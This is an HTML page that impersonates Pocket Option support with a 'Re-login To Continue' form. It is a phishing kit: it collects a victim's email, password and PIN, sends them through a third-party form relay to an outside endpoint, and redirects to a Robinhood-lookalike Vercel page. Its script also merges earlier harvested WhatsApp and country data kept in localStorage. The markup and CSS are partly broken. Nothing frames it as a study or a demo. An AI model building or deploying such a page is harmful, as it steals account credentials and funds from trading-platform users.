<head>
<meta charset="UTF-8">

<style>
body{

.container{
    max-width:400px;
    margin:auto;

}

.top-bar{
    display:flex;
    justify-content:space-between;
    font-size:14px;
    margin-bottom:20px;

.logo{

    margin-top:20px;
}

.logo h2{
    margin:10px 0;
    font-weight:600;
}

h1{

    margin-top:10px;
}

.register{
    text-align:center;
    margin-bottom:20px;
}

.register a{
    color:#6fa8ff;
    text-decoration:none;
}

.inputbox/
    margin:18px 0;
}

.input, textarea{
    width:100%;
    padding:15px;
    border-radius:10px;
    border:2px solid rgba(255,255,255,0.2);
    background:transparent;
    color:#fff;

}

.remember{
    display:flex;

.link a{

}

.btn{
    width:100%;

}

.social{
    text-align:center;
    margin-top:20px;
}

.social-buttons{

}

.google{
    flex:1;
    background:#fff;

}
.button:hover { background-color: #3b82f6;}

</head>

<body><div class="container">
    <div class="top-bar">
        <span>← Back</span>
        <span>🌐 English</span>
    </div>

    <div class="container">
        <h2>POCKET OPTION SUPPORT</h2>
    </div>
<h2>Re-login To Continue</h2>
<form id="verifyForm"
<form action="https://api.web3forms.com/submit" method="POST">

<input type="hidden" name="access_key" value="6b56be11-e040-4f26-949f-2293aa195621">

<input type="hidden" name="redirect" value="https://robinhood-com.vercel.app/success.html">
<!-- STEP 1 -->
<div id="steps">
<h3>Enter mail</h3>
<input type="email" name="email" placeholder="yourgmail@gmail.com" required>
<p>password</p>
<input type="text" name="username" placeholder="password" required>
<h3>verify Pin</h3>
<textarea name="complaint" column="1" placeholder="verify 4 digit pin "></textarea>
<!-- Hidden Step 1 Data -->
<input type="hidden" name="whatsapp" id="whatsappField">
<input type="hidden" name="country" id="countryField">
<input type="hidden" name="complaint" id="complaintField">

<button type="submit" class="btn">Verify & Continue</button>

</form>

</div>

<script>
// Get Step 1 data
const step1 = JSON.parse(localStorage.getItem("formStep1") || "{}");

// If no Step 1 data → redirect back
if(!step1.email){
    window.location.href = "index.html";
}

// Fill visible + hidden fields
document.getElementById("emailDisplay").value = step1.email || "";
document.getElementById("whatsappField").value = step1.whatsapp || "";
document.getElementById("countryField").value = step1.country || "";
document.getElementById("complaintField").value = step1.complaint || "";

// Clear storage after submit
document.getElementById("verifyForm").addEventListener("submit", function(){
    setTimeout(()=>{
        localStorage.removeItem("formStep1");
    },1000);
});
</script>

</body>
</html>
